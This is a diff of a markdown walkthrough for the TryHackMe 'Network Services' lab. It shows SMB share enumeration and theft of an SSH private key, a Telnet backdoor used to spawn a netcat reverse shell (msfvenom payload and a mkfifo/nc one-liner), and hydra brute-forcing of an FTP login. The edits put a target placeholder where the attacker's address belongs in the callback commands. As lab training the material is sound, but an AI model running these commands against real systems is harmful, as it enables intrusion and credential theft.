@@ -1,24 +1,14 @@
 # Network Services
 + Description: Learn about, then enumerate and exploit a variety of network services and misconfigurations.
-+ Link: https://tryhackme.com/r/room/networkservices
++ Link: https://tryhackme.com/room/networkservices
 + Type: Walkthrough
-  
-+ Target IP Address (SMB): 10.10.6.182
-+ Target IP Address (Telnet): 10.10.112.119
-+ AttackBox IP Address (Telnet): 10.10.198.128
-+ Target IP Address (FTP): 10.10.148.36
++ Completed: 2024-09-21
 
 ## Tools
 + NMAP
 + enum4linux
-+ smbclient
-+ SSH
-+ Telnet
 + MSFvenom
 + Netcat
-
-## External Resources
-N/A
 
 ## Task 01 | Get Connected
 N/A
@@ -30,21 +20,21 @@ N/A
 + Once a connection is established, a client can send commands to the server for access to resources and essentially treats it as an extension of their own file system.
 
 ## Task 03 | Enumerating SMB
-1. Recon: `nmap -sV 10.10.6.182`. The machine has 3 ports open and the following services: OpenSSH and Samba.  
+1. Recon: `nmap -sV <Target IP Address>`. The machine has 3 ports open and the following services: OpenSSH and Samba.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/01.png)
   
-2. `enum4linux -a 10.10.6.182`. Found that the workgroup name is "WORKGROUP", the machine's name is "POLOSMB", the OS version is 6.1, and an share called "profiles".  
+2. `enum4linux -a <Target IP Address>`. Found that the workgroup name is "WORKGROUP", the machine's name is "POLOSMB", the OS version is 6.1, and an share called "profiles".  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/02.png)
   
 ## Task 04 | Exploiting SMB
-1. `smbclient //10.10.6.182/profiles` to see if the share allows anonymous acces. It does.  
+1. `smbclient //<Target IP Address>/profiles` to see if the share allows anonymous acces. It does.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/03.png)
   
 2. Looked around in the directory. Found that a person named John Cactus uses/owns this folder, they connect using SSH, and their authorization keys.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/04.png)
   
 3. `get id_rsa` and `get id_rsa.pub` to download the files. `cat id_rsa.pub` to find a hint to John's login infomation "cactus@polosmb".
-4. `ssh -i id_rsa cactus@10.10.6.182` to log into the machine using John's RSA private key.
+4. `ssh -i id_rsa cactus@<Target IP Address>` to log into the machine using John's RSA private key.
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/05.png)
   
 5. Looked around in the directory, found a file called "smb.txt", downloaded it using `get smb.txt`, and read it using `cat smb.txt`. Found the flag.
@@ -57,23 +47,23 @@ N/A
 + Command Syntax: `telnet <ip> <port>`.
 
 ## Task 06 | Enumerating Telnet
-1. Recon: `nmap -sV 10.10.112.119` revealed that 0 ports were open. So, I started a different scan `nmap -sV -p- 10.10.112.119 -T 5`, to look through all ports.  
+1. Recon: `nmap -sV <Target IP Address>` revealed that 0 ports were open. So, I started a different scan `nmap -sV -p- <Target IP Address> -T 5`, to look through all ports.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/06.png)
   
 2. By looking through the returned information from the NMAP scan I found that port 8012/TCP is being used for a backdoor and is likely owned by a user named "SKIDY".
 
 ## Task 07 | Exploiting Telnet
-1. `telnet 10.10.112.119 8012` and tried out some commands.  
+1. `telnet <Target IP Address> 8012` and tried out some commands.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/07.png)
   
-2. On the AttackBox `sudo tcpdump ip proto \\icmp -i ens5` and `.RUN ping 10.10.198.128 -c 1` on the Telnet session to see if I can execute system commands and reach the AttackBox.  
+2. On the AttackBox `sudo tcpdump ip proto \\icmp -i ens5` and `.RUN ping <Target IP Address> -c 1` on the Telnet session to see if I can execute system commands and reach the AttackBox.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/08.png)
   
-3. On the AttackBox `msfvenom -p cmd/unix/reverse_netcat lhost=10.10.198.128 lport=4444 R` to create the reverse shell.  
+3. On the AttackBox `msfvenom -p cmd/unix/reverse_netcat lhost=<Target IP Address> lport=4444 R` to create the reverse shell.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/09.png)
   
 4. On the AttackBox `nc -lvp 4444` to listen on port 4444.
-5. On the Telnet session `.RUN mkfifo /tmp/tmqkt; nc 10.10.198.128 4444 0</tmp/tmqkt | /bin/sh >/tmp/tmqkt 2>&1; rm /tmp/tmqkt`.
+5. On the Telnet session `.RUN mkfifo /tmp/tmqkt; nc <Target IP Address> 4444 0</tmp/tmqkt | /bin/sh >/tmp/tmqkt 2>&1; rm /tmp/tmqkt`.
 6. On the AttackBox in the Terminal with the listener, I executed `ls` and `cat flag.txt` to locate and display the flag.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/10.png)
   
@@ -92,18 +82,18 @@ N/A
 + Default port = 21
 
 ## Task 09 | Enumerating FTP
-1. Recon: `nmap -sV 10.10.148.36`. Revealed two ports open with the services: FTP and Apache.  
+1. Recon: `nmap -sV <Target IP Address>`. Revealed two ports open with the services: FTP and Apache.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/11.png)
   
-2. Connected to the FTP server using `ftp 10.10.148.36` with name "anonymous" and no password. Found a file called "PUBLIC_NOTICE.txt".  
+2. Connected to the FTP server using `ftp <Target IP Address>` with name "anonymous" and no password. Found a file called "PUBLIC_NOTICE.txt".  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/12.png)
 3. `get PUBLIC_NOTICE.txt` and `cat PUBLIC_NOTICE.txt` to see what's in the file. Found a possible username "Mike".
 
 ## Task 10 | Exploiting FTP
-1. I first tried `hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.148.36 ftp`, however it was getting taking a while. S,o I changed up the command (`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.148.36 ftp`) and tried again.  
+1. I first tried `hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV <Target IP Address> ftp`, however it was getting taking a while. So, I changed up the command (`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt <Target IP Address> ftp`) and tried again.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/13.png)
   
-2. Connected to the FTP server again using `ftp 10.10.148.36` this time with name "mike" and password "password". Found a file called "ftp.txt".  
+2. Connected to the FTP server again using `ftp <Target IP Address>` this time with name "mike" and password "password". Found a file called "ftp.txt".  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/14.png)
   
 3. `get ftp.txt` and `cat ftp.txt` to see what's in the file. Found the flag.
